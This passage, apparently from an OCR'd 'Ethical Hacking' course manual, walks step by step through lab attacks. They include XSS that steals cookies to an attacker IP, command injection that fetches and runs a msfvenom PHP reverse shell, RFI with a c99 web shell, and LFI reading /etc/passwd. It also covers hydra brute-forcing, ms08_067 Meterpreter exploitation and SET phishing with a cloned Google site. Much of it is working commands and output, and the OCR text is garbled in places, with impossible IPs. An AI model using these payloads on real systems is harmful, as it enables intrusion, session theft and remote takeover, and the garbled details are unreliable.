+    Encoder script http://www.google.com/mercurial/encoder/
+
+    ```
+
+
+    %3Cscript%3EDocument.location%3D%27http%3A%2F%2F192.168.1.7%2FIndex.php%3F%27Document.cookie%3B%3C%2Fscript%3E%8A
+
+
+    ```
+
+    http://192.168.1.3/vulnerabilities/xss/r/?name=%3Cscript%3Elocation%3D%27http%3A%2F%2F192.168.1.7%2FIndex.php%3F%27Document.cookie%3B%3C%2Fscript%3E%8A
+
+    ```
+
+
+    +   * We make a listener
+
+
+    +   * The admin will open the link that you sent through the email'
+  merge: -1
+  pgno: 97
+- img_proc: true
+  md: "http://192.168.1.3/vulnerabilities/xs/?r=%3Cscript%3Edocument.location%3D%27http%3A%2F%2F192.168.1.7%2FIndex.php%3F%26document.cookie%3B%2Fscript%3E%0A\n\
+    \n+   - The hacker will listen on port 80. He will get the admin session id from\
+    \ the cookie of the admin\n\n```\nroot@bt:~# nc -lvp 80\nlistening on [any] 80\
+    \ ...\nout\n192.168.1.6 inverse host lookup failed: Unknown server error : Connection\
+    \ timed\nconnect to [192.168.1.7] (from (UNKNOWN)) [192.168.1.6] 3433\nGET /index.php?PHPSESSID=9b7r8id90cu9as2c341nt2%26security=low\
+    \ HTTP/1.1\nHost: 192.168.1.7\nUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:22.0)\
+    \ Gecko/20100101 Firefox/22.0\nAccept: text/html,application/xhtml+xml,application//*;q=0.9\n\
+    Accept-Language: en-US,en;q=0.8\nAccept-Encoding: gzip, deflate\r\n-A\nReferer:\
+    \ http://192.168.1.3/vulnerabilities/xs/?r=%3Cscript%3Edocument.location%3D%27http%3A%2F%2F192.168.1.7%2FIndex.php%3F%26document.cookie%3B%2Fscript%3E%0A\r\
+    \nConnection: keep-alive\r\n\n```\n\n+   - The hacker will browse the application\
+    \ website. He will use temper to change the session id to the hacker session id\n\
+    \n![](img/91b4da451291288ee84ff207e23ccb97_98_0.png)"
+  merge: -1
+  pgno: 98
+- img_proc: true
+  md: '# p).Persistent XSS Threat With Metasploit
+
+
+    Armitage
+
+
+    Start browser_autopwn module <script>document.location=''http://192.168.168/''</script>
+
+
+    +   - The browser autopwn makes the web server active and will browse it will
+    apply all the exploits for the browser and any exploit it will browse in the browser
+    will though it gain access to the web server and reverse connection to hacker
+    machine
+
+    - Go back track and operate the machine. Put the LHost hacker machine Ip and the
+    SRVport 80 and URIAPATH/
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_99_0.png)
+
+
+    +   - Install the fix in order to adjust the settings of the browser elements
+    so it can withstand the script.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_99_1.png)
+
+
+    +   - When to go to the guest book, it will be forwarded to hacker computer.
+
+    - You can use insert of autopwn module to operate the java_signed_applet. We in
+    LHOST the hacker computer Ip and the port any port and decide the type of payload
+    be java/meterpreter/reverse_tcp. The SRVHOST same as us and the SRport 80 and
+    URI path/
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_99_2.png)
+
+
+    +   - Any body will browse the link which will send him/her the java/meterpreter/reverse_tcp
+    payload
+
+    - When the client go to the guest book, it will be forwarded to hacker computer
+    and will download the payload.'
+  merge: -1
+  pgno: 99
+- img_proc: true
+  md: <!-- no content -->
+  merge: -1
+  pgno: 100
+- img_proc: true
+  md: '# Understand Command Execution Vulnerabilities
+
+
+    One of the most critical vulnerabilities that a penetration tester can come across
+    a web application penetration test is to find an application that it will allow
+    him to execute system commands.rate this vulnerability is high because it can
+    allow any unauthorized and malicious user to execute commands from the web application
+    to the system and to harvest large amount of information or to compromise the
+    target host.In this article we will see how we exploit this vulnerability by using
+    the Damn Vulnerable Web Application for demonstration.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_101_0.png)
+
+
+    or la (Unix)
+
+    &dir (Windows)
+
+
+    +   - We can get through the infected url except certain commands in unix and
+    windows. We can upload payload and through this payload we can hack the server.
+
+    - You can browse the webserver
+
+    - You can upload payload in the web server. We will use msfvenom. Msfvenom is
+    combination of msfpayload and msfencode.
+
+
+    Msfvenom -p php/meterpreter/reverse_tcp lhost (ip of hacker computer) lport-(any)
+    -f raw > /root/test.php
+
+
+    ```
+
+    root@:
+
+    root@ # msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.7 lport=5555 -f
+    raw > /root/desktop/test.php
+
+    root@ # cd Desktop/
+
+    ```
+
+
+    +   - Remove the hash from the php file
+
+    - We have to copy the payload in the web server but it must text file
+
+
+    Cp /root/test.txt /var/www/test.txt
+
+
+    +   - We will apply the command in the website to upload the payload through the
+    wget command
+
+
+    ```
+
+    wget http://192.168.1.7/test.txt -O /tmp/test.php ; php -f /tmp/test.php
+
+    ```
+
+
+    ;wget http://192.168.52.137/test.txt -O /tmp/test.php ; php -f /tmp/test.php
+
+
+    # Vulnerability: Command Execution
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_101_1.png)
+
+
+    +   - Prepare the multi handler.
+
+
+    # msfvenom
+
+    # use exploit/multi/handler
+
+    # set lhost (hacker ip)
+
+    # set lport (ip we put for the payload)
+
+    # exploit'
+  merge: -1
+  pgno: 101
+- img_proc: true
+  md: '# Ethical Hacking
+
+
+    ```
+
+    meterpreter > exit
+
+    +] Shutting down Meterpreter...
+
+    [*] Meterpreter session 2 closed. Reason: Died
+
+    sf exploit(handler) >
+
+    sf exploit(handler) > exploit
+
+    [*] Started reverse handler on 192.168.1.7:55555
+
+    [*] Starting the payload ...
+
+    [*] Sending stage (38553 bytes) to 192.168.1.3
+
+    [*] Meterpreter session 3 opened (192.168.1.7:55555) -> 192.168.1.3:40582) at
+    201
+
+    -08-05 22:17:28 -0000
+
+    meterpreter >
+
+    ```
+
+
+    SQL injection (Blind) http://www.ss64.com/nt/
+
+
+    +   - Make sure to install the php in the webserver you want to hack
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_102_0.png)'
+  merge: -1
+  pgno: 102
+- img_proc: true
+  md: '# Brute Force Vulnerability
+
+
+    During this type of attack, the attacker is trying to bypass security mechanisms
+    while having minimal knowledge about them. Using one or more accessible methods:
+    dictionary attack (with or without mutations), brute-force attack (with given
+    classes of characters e.g.: alphanumeric, special, case (in)sensitive the attacker
+    is trying to achieve his/her goal. Considering a given method, number of tries,
+    efficiency of the system, which conducts the attack and estimated efficiency of
+    the system which is attacked, the attacker is able to calculate how long the attack
+    will have to last. Non brute-force attacks, on the other hand, which includes
+    all classes of characters, give no certainty of success.
+
+
+    Brute-force attacks are mainly used for guessing passwords and bypassing access
+    control. However there are a lot of tools which use this technique to examine
+    the web service''s catalogue structures and seek interesting, from the attacker''s
+    point of view. Very often of the attack data are in forms (GET/POST) and use Session-Ids.
+
+
+    +   - It is way of cracking passwords where we can get username and password to
+    access the website we want to hack. We will use the brute force in order to gain
+    access to the web server. After through the get and post request, We have many
+    tools that we can do through the brute force. There is beter tool, burpsuite,
+
+    - Go to dawa brute force. Add http header. Enter in user name and password.
+
+    - Take the header information
+
+
+    ```
+
+    HTTP Headers
+
+    http://192.168.1.2/vulnerabilities/brute/?username=user&password=user&Login=Login#
+
+    \GET /192.168.1.2/vulnerabilities/brute/?username=user&password=user&Login=Login
+    HTTP/1.1
+
+    Host: 192.168.1.2
+
+    User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:22.0) Gecko/20100101 Firefox/22.0
+
+    Accept: text/html,application/xml+xml,application/xml,*+q=0.9,*+q=0.8
+
+    Accept-Language: en-US,q=0.5
+
+    Accept-Encoding: gzip, deflate
+
+    Referer: http://192.168.1.2/vulnerabilities/brute/
+
+    Cookie: PHPSESSID=9ofkmps74kqcoosnpsfqsecurity=high
+
+    Connection: keep-alive
+
+
+    HTTP/1.1 200 OK
+
+    Date: Wed, 14 Aug 2013 23:24:45 GMT
+
+    Server: Apache/2.2.14 (Windows) DAV/2 mod_ssl/2.2.14 OpenSSL/0.9.8 PHP/5.3.1 mod_apreq2-20090110/2.7.1
+    mod _
+
+    X-Powered-By: PHP/5.3.1
+
+    Expires: 23 Jun 2009 12:00:00 GMT
+
+    Cache-Control: no-cache, must-revalidate
+
+    ```
+
+
+    +   - Put information in brute'
+  merge: -1
+  pgno: 103
+- img_proc: true
+  md: '# Web Form Option
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_104_0.png)
+
+
+    +   - Choose to use the brute force
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_104_1.png)
+
+
+    +   - Try in the mullitidae website with burp suite. Change the proxy settings
+    in firefox to be ip address 127.0.0.1 and port 80. It was difficult to use.
+
+    - You can use the hydra tool'
+  merge: -1
+  pgno: 104
+- img_proc: true
+  md: "# Brute Force Attacks\n\n+   * Use Bruter tools\n* Use burpsuite Tools\n\n\
+    hydra -l admin -P /root/Desktop/pass.txt 192.168.1.6 http-post-form /multillidae/index.php?page=login.php?username=USER&password=PASS&login-php-submit-button=Login\
+    \ Not Logged In\n\n+   * the username\nthe wordlists\n~ your target host, it can\
+    \ be changed by domain\nhttp-post-form -> the service module\n\n/multillidae/index.php?page=login.php\
+    \ -> path application\nusername -> input form\npassword -> input form\nlogin-php-submit-button\
+    \ -> input form at submit button\nerror message when the application failed to\
+    \ log Not Logged In\n\n![](img/91b4da451291288ee84ff207e23ccb97_105_0.png)\n\n\
+    ```\nroot@bt:~# \nFile Edit View Terminal Help\nroot@bt:~# hydra -l admin -P /root/Desktop/pass.txt\
+    \ 192.168.1.6 http-post-form /multillidae/index.php?page=login.php?username=USER&password=PASS&login-php-submit-button=Login:Not\
+    \ Logged In\nHydra v7.3 (c)2012) by van Hauser & David Maciejak - for legal purposes\
+    \ only\nHydra (http://www.thc.org/thc-hydra) starting at 2013-08-14 20:27:56\n\
+    [DATA] 10 tasks, 1 server, 10 login tries (l:1/p:10), -1 try per task\n[DATA]\
+    \ attacking service http-post-form on port 80\n[STATUS] attack finished for 192.168.1.6\
+    \ (waiting for children to finish)\n[80][www-form] host: 192.168.1.6 login: admin\
+    \ password: admin\nof 1 target successfully completed, 1 valid password found\n\
+    Hydra (http://www.thc.org/thc-hydra) finished at 2013-08-14 20:28:10\nroot@bt:~#\n\
+    ```"
+  merge: -1
+  pgno: 105
+- img_proc: true
+  md: '# q) Local File Inclusion (LFI):
+
+
+    +   * Understand File Inclusion vulnerability
+
+
+    +   * Local File Inclusion (LFI)
+
+
+    +   * Local File Inclusion mean loading local file such as /etc/passwd,/etc host
+    on the php web pages. There are many programming mistake for occurring this vulnerability.
+    When Programmer put some bad in the php web pages that this vulnerable
+
+
+    +   * Remote File Inclusion (RFI)
+
+
+    +   * Remote File Inclusion (RFI) is a type of vulnerability most often found
+    on websites. it allows an attacker to include a remote, usually through a script
+    on the web server. The vulnerability occurs due to the use of user-supplied input
+    without proper validation. This can lead to something as outputting the contents
+    of the file
+
+
+    +   * In local file inclusion, if the web application has the hole local file
+    inclusion, through this hole we can read files inside the webserver like /etc/passwd
+    .
+
+
+    +   * In DVWA, go to file inclusion.
+
+
+    ```
+
+    192.168.1.2/vulnerabilities/lfi/?page=include.php
+
+    ```
+
+
+    +   * Change with the file you want to download /etc/passwd
+
+
+    ```
+
+    192.168.1.2/vulnerabilities/lfi/?page=/etc/passwd
+
+    ```
+
+
+    +   * Most important file we can download
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_106_0.png)
+
+
+    +   * In windows machine we use other command
+
+
+    Page=../../../boot.ini
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_106_1.png)'
+  merge: -1
+  pgno: 106
+- img_proc: true
+  md: '# r) Remote File Inclusion (RFI):
+
+
+    +   - When the application has this, we can put another page inside this website.
+    This web page called web shell
+
+    - Understanding web shell
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_107_0.png)
+
+
+    +   - The shell is written in any programming language, and mostly in php. Through
+    the remote inclusion we can gain access to the web server and apply the shell
+    on it. There are some shells like C99.php, R57.php, C100.php.
+
+    - C99 shell
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_107_1.png)
+
+
+    +   - R57'
+  merge: -1
+  pgno: 107
+- img_proc: true
+  md: 'Select also
+
+
+    find files
+
+
+    Execute
+
+
+    Find text in
+
+
+    Find
+
+
+    In file C:\compile\shell\
+
+
+    C:\inet\home\
+
+
+    Only in
+
+
+    log.php
+
+
+    // eval script();
+
+
+    // ushell("shell.php");
+
+
+    // readfile("/etc/passwd");
+
+
+    Eval PHP code
+
+
+    Execute
+
+
+    Upload files on server ::
+
+
+    Local Name
+
+
+    No file selected.
+
+
+    Upload
+
+
+    Remote Name
+
+
+    Download files from server ::
+
+
+    C:\compile\shell\
+
+
+    Download
+
+
+    Authentication
+
+
+    without authentication
+
+
+    ftp
+
+
+    FTP
+
+
+    Download files from remote ftp server
+
+
+    FTP server: 127.0.0.1:
+
+
+    Send file to remote ftp server
+
+
+    Username
+
+
+    anonymous
+
+
+    Password
+
+
+    bob@microsoft.com
+
+
+    File on server:
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_108_0.png)
+
+
+    results for :
+
+
+    +   - Put the shell in the folder /var/www. Put the shell as text file in the
+    hacker computer. Start the apache server
+
+    - Go to multilitidae web site.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_108_1.png)
+
+
+    +   - Change home.php to the hacker computer shell address http://192.168.52.134/c99.txt'
+  merge: -1
+  pgno: 108
+- img_proc: true
+  md: '# # c99Shell v.1.0 pre-release build #16!
+
+
+    ```
+
+    Server Apache/2.4.41 (Ubuntu)
+
+    - Ubuntu Linux 5.4.0-42-generic #42-Ubuntu SMP (Jul 2 20:48:33 UTC 2020)
+
+    - PHP/7.4.3-fpm
+
+    - OpenSSL/1.1.1d-10 Mar 2020
+
+    10:13:10 UTC 2020
+
+    ```
+
+
+    Owned by hacker
+
+
+    +   - Try in the dvwa, but then we put the shell address
+
+
+    http://192.168.52.134/dvwa/vulnerabilities/fi/?page=include.php
+
+
+    http://192.168.52.134/dvwa/multilithard/fi/?page=http://192.168.52.137/c99.php
+
+
+    http://192.168.52.134/multilithard/page=http://192.168.52.137/c99.php ?
+
+
+    # # c99Shell v.1.0 pre-release build #16!
+
+
+    ```
+
+    Server Apache/2.4.41 (Ubuntu)
+
+    - Ubuntu Linux 5.4.0-42-generic #42-Ubuntu SMP (Jul 2 20:48:33 UTC 2020)
+
+    - PHP/7.4.3-fpm
+
+    - OpenSSL/1.1.1d-10 Mar 2020
+
+    10:13:10 UTC 2020
+
+    ```
+
+
+    Owned by hacker
+
+
+    +   - We can create payload and upload it in the web server
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_109_0.png)'
+  merge: -1
+  pgno: 109
+- img_proc: true
+  md: "+   - Create the php/meterpreter/reverse_tcp payload in the hacker computer\n\
+    \n```\nroot@bt:~ \nFile Edit View Terminal Help\nroot@bt:~ # msfpayload php/meterpreter/reverse_tcp\
+    \ LHOST=192.168.1.6 LPORT=5555 -t eduors.php\n```\n\n+   - Open the file and remove\
+    \ the hash command in the php file.\n- Go to/var/www in hacker computer and put\
+    \ it on the payload. Start the apache service.\n- Open the multi handler in the\
+    \ same handler\n\n```\nmsf > exploit/multi/handler\nmsf exploit(handler) > set\
+    \ PAYLOAD file:/root/eduors.php\n[-] The value specified for PAYLOAD is not valid\n\
+    msf exploit(handler) > set PAYLOAD php/meterpreter/reverse_tcp\nPAYLOAD => php/meterpreter/reverse_tcp\n\
+    msf exploit(handler) > set LHOST 192.168.1.6\nLHOST => 192.168.1.6\nmsf exploit(handler)\
+    \ > set LPORT 5555\nLPORT => 5555\nmsf exploit(handler) > exploit\n```\n\n![](img/91b4da451291288ee84ff207e23ccb97_110_0.png)\n\
+    \n+   - Using the browser upload the payload to the web server.\n\n![](img/91b4da451291288ee84ff207e23ccb97_110_1.png)\n\
+    \n+   - It will open the meterpreter session\n\n```\nmsf > exploit/multi/handler\n\
+    msf exploit(handler) > set PAYLOAD file:///root/eduors.php\n[-] The value specified\
+    \ for PAYLOAD is not valid.\nmsf exploit(handler) > set PAYLOAD php/meterpreter/reverse_tcp\n\
+    PAYLOAD => php/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.1.6\n\
+    LHOST => 192.168.1.6\nmsf exploit(handler) > set LPORT 5555\nLPORT => 5555\nmsf\
+    \ exploit(handler) > exploit\n\n[*] Started reverse handler on 192.168.1.6:5555\n\
+    [*] Starting the payload handler...\n[*] Sending stage (38553 bytes) to 192.168.1.6\n\
+    [*] Meterpreter session 1 opened (192.168.1.6:5555) -> 192.168.1.6\n-08-15 20:04:16\
+    \ -0400\nmeterpreter >\n```"
+  merge: -1
+  pgno: 110
+- img_proc: true
+  md: '# File Upload Vulnerability:
+
+
+    Uploaded files represent a significant risk to applications. The first step in
+    many attacks is to get some code to the system to be attacked. Then the attack
+    only needs to find a way to get the code executed. Using a file upload helps the
+    attacker accomplish the first step.
+
+
+    The consequences of unrestricted file upload can vary, including complete system
+    takeover, an overloaded file system, forwarding attacks to backend systems, and
+    simple defacement. It depends on what the application does with the uploaded file,
+    including where it is stored.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_111_0.png)
+
+
+    +   - It means that the website enables us to upload some files such as images
+    or scripts. We can upload shells and makes it excitable and we can control the
+    web server. We can make reverse tcp payload and upload it in the web server
+
+    - Go to DVWA and change security low. Go to file upload and upload shell.
+
+
+    # Vulnerability: File Upload
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_111_1.png)
+
+
+    +   - Browse the shell
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_111_2.png)'
+  merge: -1
+  pgno: 111
+- img_proc: true
+  md: '# 102.168.1.10 SSH-2.0-OpenSSH_8.2p1
+
+
+    BackTrack Offensive Exploit-DB SourceFm
+
+    Linux 5.4.0-26-generic #x86_64 Thu Aug 19 09:12:52 UTC 2020 (exploit-db.com)
+
+    user: 65534 (nobody) group: 65534 (nobody)
+
+    idle: 5.1s since login | last login: 2023-03-17 13:27:49
+
+    wd: /opt/rackf/files/hacks/exploit.php
+
+
+    | Name | Size | Owner/Group | Permissions | Actions |
+
+    | --- | --- | --- | --- | --- |
+
+    | [DIR] | | 2023-03-18 17:27:36 | nobody/nogroup | rwxr-xr-x | |
+
+    | [DIR] | | 2023-03-18 21:45:26 | nobody/nogroup | rwxr-xr-x | |
+
+    | [DIR] | | 2023-03-18 17:27:30 | nobody/nogroup | rwxr-xr-x | |
+
+    | click_email.php | 467 B | 2023-03-18 21:45:27 | nobody/nogroup | rw-r--r-- |
+    |
+
+    | shell.php | 64.59 KB | 2023-03-18 17:27:36 | nobody/nogroup | rw-r--r-- | |
+
+    | exploit.php | 64.59 KB | 2023-03-18 17:29:36 | nobody/nogroup | rw-r--r-- |
+    |
+
+
+    +   - We can use upf reverse tcp payload. Remove the hash from the php file
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_112_0.png)
+
+
+    +   - Upload the payload in the website using the upload handler.'
+  merge: -1
+  pgno: 112
+- img_proc: true
+  md: '# Vulnerability: File Upload
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_113_0.png)
+
+
+    +   - Execute the payload. Meterpreter session will open.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_113_1.png)'
+  merge: -1
+  pgno: 113
+- img_proc: true
+  md: '# f) CSRF Vulnerability:
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_114_0.png)
+
+
+    +   - Through CSRF hole, we can create and change user information and change
+    certain data in the web site
+
+    - We need tool called csrf tester. We can download it from the web site. I did
+    not try to apply the method as it was difficult.'
+  merge: -1
+  pgno: 114
+- img_proc: true
+  md: '# 6. Part E: Windows and Linux Hacking
+
+
+    a) Understanding Server Side Attack and Client Side Attack
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_115_0.png)
+
+
+    +   * Server Side Attack
+
+    * Hacker use exploit can be launched over network and work without any action
+    from user
+
+    * The exploit in system or O.S uses metasploit for attack by server side attack
+
+    * Client Side Attack
+
+    * These are attacks that target vulnerabilities in client applications that interact
+    with a malicious server or process malicious data. Here, the client initiates
+    the connection that could result in an attack. If a client does not interact with
+    a server, it is not at risk, because it doesn''t process any potentially harmful
+    data sent from the server.
+
+
+    # How Do Reverse-Connecting Trojans?
+
+
+    Reverse-connecting Trojans let an attacker access a machine on the internal network
+    from the outside. The hacker can install a simple Trojan program on a system on
+    the internal network, such as the reverse WWW shell server. On a regular basis
+    (usually every 60 seconds), the internal server tries to access the external system
+    to pick up commands. If the attacker has typed something into the master system,
+    this command is retrieved and executed on the internal system. Reverse WWW shell
+    uses standard HTTP. It''s dangerous because it''s difficult to detect—it looks
+    like a client is browsing the Web from the internal network.'
+  merge: -1
+  pgno: 115
+- img_proc: true
+  md: '![](img/91b4da451291288ee84ff207e23ccb97_116_0.png)
+
+
+    The Trojan program will make server which can be installed in the client computer
+    we want tohack. The reverse connection will make the server in the client computer
+    makes connection on the Trojan program.'
+  merge: -1
+  pgno: 116
+- img_proc: true
+  md: '# b) Hacking windows by ms08_067 netapi32
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_117_0.png)
+
+
+    +   - Steps to attack windows xp sp3
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_117_1.png)
+
+
+    +   - Scan the subnet using the command nmap -A to find windows machine
+
+
+    Nmap - A 192.168.1.0 254
+
+
+    Msfconsole
+
+
+    Use exploit/windows/smb/ms08_067_netapi
+
+
+    Set rhost 192.168.52.132 (the other win xp machine that has the exploit)
+
+
+    exploit'
+  merge: -1
+  pgno: 117
+- img_proc: true
+  md: '```
+
+    msf exploit/windows/smb/ms08_067 metapi
+
+    msf exploit(ms08_067 metapi) > set RHOST 192.168.1.6
+
+    RHOST => 192.168.1.6
+
+    msf exploit(ms08_067 metapi) > exploit
+
+
+    [*] Started reverse handler on 192.168.1.3:4444
+
+    [*] Automatically detecting the target...
+
+    [*] Fingerprint: Windows XP Service Pack 3 (English)
+
+    [*] Selected Target: Windows XP SP3 (ENGLISH)
+
+    [*] Attempting to trigger the vulnerability...
+
+    [*] Sending stage (2972128 bytes) to 192.168.1.6
+
+    [*] Metpreter session 1 opened (192.168.1.3:4444) -> 192.168.1.6:14903
+
+    08-24 18:37:00 -0400
+
+    ```
+
+
+    +   - Then you can work in the interpreter session and write any command.
+
+    - Some commands: ls, sysinfo, hashdump, screenshot, ipconfig, shell
+
+    - When you go to shell you can use the following commands: net use, ipconfig/all,
+    tasklist, net user, net share, netstat -an
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_118_0.png)
+
+
+    +   - You can run payload in the computer using this
+
+
+    ```
+
+    msf exploit(ms08_067_metapi) > set PAYLOAD windows/meterpreter/reverse_tcp
+
+    PAYLOAD => windows/meterpreter/reverse_tcp
+
+    msf exploit(ms08_067_metapi) > set LHOST 192.168.1.3
+
+    LHOST => 192.168.1.3
+
+    msf exploit(ms08_067_metapi) > set LPORT 4444
+
+    LPORT => 4444
+
+    msf exploit(ms08_067_metapi) > set RHOST 192.168.1.10
+
+    RHOST => 192.168.1.10
+
+    msf exploit(ms08_067_metapi) > exploit
+
+
+    [*] Started reverse handler on 192.168.1.3:4444
+
+    [*] Automatically detecting the target...
+
+    [*] Fingerprint: Windows XP Service Pack 3 (English)
+
+    [*] Selected Target: Windows XP SP3 (ENGLISH)
+
+    [*] Attempting to trigger the vulnerability...
+
+    [*] Sending stage (2972128 bytes) to 192.168.1.3
+
+    [*] Metpreter session 1 opened (192.168.1.3:4444) -> 192.168.1.10:10441 at 2013
+
+    08-25 14:20:32 -0400
+
+    ```
+
+
+    # Msfconsole
+
+
+    Use exploit/windows/smb/ms08_067_metapi
+
+
+    Set PAYLOAD windows/meterpreter/reverse_tcp
+
+
+    Set LHOST 192.168.1.535
+
+
+    Set LPORT 4444
+
+
+    Set RHOST 192.168.1.532 (the other win xp machine that has the exploit)
+
+
+    Exploit'
+  merge: -1
+  pgno: 118
+- img_proc: true
+  md: <!-- no content -->
+  merge: -1
+  pgno: 119
+- img_proc: true
+  md: 'This module exploits a stack buffer overflow in the RPCSS service, this vulnerability
+    was originally found by the Last Stage of Delirium research group and has been
+    widely exploited ever since. This module can exploit the English versions of Windows
+    NT 4.0 SP3-6a, Windows 2000, Windows XP, and Windows 2003 all in one request:
+
+
+    +   - You can also use armitage
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_120_0.png)'
+  merge: -1
+  pgno: 120
+- img_proc: true
+  md: '# Client side attack: Hack Windows by Java Signed Applet
+
+
+    This exploit creates a jar file via the Maf: Exploit: java_mixin, then signs it.
+
+    The resulting signed applet is presented to the victim via a web page with an
+    applet tag. On older versions the victim''s JVM will show a dialog asking if they
+    trust the signed applet. Newer versions will display a WARNING in the ''Publisher''
+    line when the signature is not trusted (i.e. not signed by a trusted CA). The
+    SigningCert option allows you to provide a trusted code signing cert, the values
+    in which will override CERTCN. If SigningCert is not given, a randomly generated
+    self-signed cert will be used. Either way, once the user clicks "run", the exploit
+    executes with full user permissions.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_121_0.png)
+
+
+    +   - It is a client side attack. When the hacker uses java signed applet module
+    in the metasploit it will act as server and will have a website that has java
+    meter reverse payload. It requires that the client have java application to execute
+    the java payload. Anybody will go to the website will download and install the
+    payload and the hacker can control the computer. It can hack any machine that
+    has the java application.
+
+    - You set the LHHOST and the RHOST the hacker ip address. The LPORT can be any
+    port and RPORT put 8080 or 80 or any other port. Use the URI part.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_121_1.png)'
+  merge: -1
+  pgno: 121
+- img_proc: true
+  md: <!-- no content -->
+  merge: -1
+  pgno: 122
+- img_proc: true
+  md: "# e) Client attack: Hack Windows by Java Applet (HTTP shell with IES encryption\
+    \ +phishing + spoof DNS)\n\n![](img/91b4da451291288ee84ff207e23ccb97_123_0.png)\n\
+    \n+   - We will do fake site for www.google.com and any person in the local network\
+    \ wants to go for this site he will come first for your fake website and the website\
+    \ will download payload to the client customer.\n- Go to back then exploitation\
+    \ tools then social engineering tools social engineering toolkit the set com\n\
+    \n```\n```\nroot@kali:/test/exploits/set# ./setup.py install\nReading package\
+    \ lists... Done\nbuilding dependency tree\nReading state information... Done\n\
+    Package git is not available, but is referred to by another\nThis may mean that\
+    \ the package is missing, has been observed\nis is only available from another\
+    \ source\nE: Package has no installation candidate\n[!] set is already installed\
+    \ in /usr/share/settoolkit, \nroot@kali:/test/exploits/set# ./set-update\n[-]\
+    \ Updating the Social-Engineering Toolkit, be patient...\n[-] Performing cleanup\
+    \ first...\nRemoving src/agreement\nRemoving src/logs/\n[|] Updating... This could\
+    \ take a little bit...\n```\n```\n\nSet > /setup.py install\n./set-update\n./settoolkit\n\
+    \n![](img/91b4da451291288ee84ff207e23ccb97_123_1.png)\n\n+   - Choose 1 for social\
+    \ engineering attack. Then 2 for website attack vectors. Then 1 for java applet\
+    \ attack method. Then 2 for site cloner."
+  merge: -1
+  pgno: 123
+- img_proc: true
+  md: '# Ethical Hacking
+
+
+    +   Select from the menu:
+
+    1) Spear-Phishing Attack Vector
+
+    2) Website Attack Vectors
+
+    3) Infectious Media Generator
+
+    4) Create a Payload and Listener
+
+    5) Mass Mailer Attack
+
+    6) Arduino-Base Attack Vector
+
+    7) SMS Spoofing Attack Vector
+
+    8) Wireless Access Point Attack Vector
+
+    9) Oncode Generator Attack Vector
+
+    10) Password Attack Vectors
+
+    11) Third Party Modules
+
+
+    99) Return back to the main menu.
+
+
+    +   1) Java Applet Attack Method
+
+    2) Metasploit Browser Exploit Method
+
+    3) Credential Harvester Attack Method
+
+    4) Tabnabbing Attack Method
+
+    5) Webjacking Attack Method
+
+    6) MultiAttack Method
+
+    7) Create or import a CodeSigning Certificate
+
+
+    99) Return to Main Menu
+
+
+    +   1) Web Templates
+
+    2) Site Cloner
+
+    3) Custom Import
+
+
+    99) Return to Web Attack Menu
+
+
+    +   * Then choose n to apply the method for the computers in the internal networks.
+    Put the Ip for the hacker computer 192.168.52.135. Then put the website that you
+    want to make phishing for it http://www.google.com.'
+  merge: -1
+  pgno: 124
+- img_proc: true
+  md: '# Ethical Hacking
+
+
+    ```
+
+    [-] NAT/Port Forwarding cannot
+
+    [-] not externally exposed and apply ip address to your listener
+
+    [-] Are you using NAT/Port Forwarding (yes/no): n
+
+    [-] Enter the IP address of your interface IP or if you are using an external
+    IP, w
+
+    [-] will be used for the connection back and to house the web server (your interface
+    address)
+
+    connection:192.168.2.113 or hostname for the reverse c
+
+    [-] SET accepts with HTTP and HTTPS
+
+    [-] Example http://www.thiswebsite.com
+
+    [-] combacks Enter the url to clone: http
+
+    ```
+
+
+    +   [-] Cloning the website: http://www.google.com
+
+    [-] This could take a little bit...
+
+
+    +   * It will ask you the type of payload you want to use with java signed applet.
+    Choose 12 which is SE toolkit reverse shell encryption support
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_125_0.png)
+
+
+    +   * Put the port listener 6666'
+  merge: -1
+  pgno: 125
+- img_proc: true
+  md: '# Ethical Hacker
+
+
+    +   12) Toolkit HTTP Reverse Shell
+
+    Pure native HTTP shell with AES
+
+    encryption support
+
+    13) RATTE HTTP Tunneling Payload
+
+    Security bypass payload that will
+
+    tunnel all comms over HTTP
+
+    14) ShellcodeExec Alphansumeric
+
+    This will drop a interpreter payload
+
+    ad through shellcodeexec
+
+    15) Pyinjector Shellcode Injection
+
+    This will drop a meterpreter payload
+
+    ad through Pyinjector
+
+    16) MultiInjector Shellcode Injection
+
+    This will drop multiple Metploit
+
+    17) Import your executable
+
+    Specify path for your own executable
+
+    payloads via memory
+
+    able
+
+
+    ```
+
+    set:payload12
+
+    set:payload PORT of the listener 443 5066
+
+    [-] Done, moving the payload into the action,
+
+    [-] Targeting of OSX/linux (POSIX-based) as well. Prepping posix payload...
+
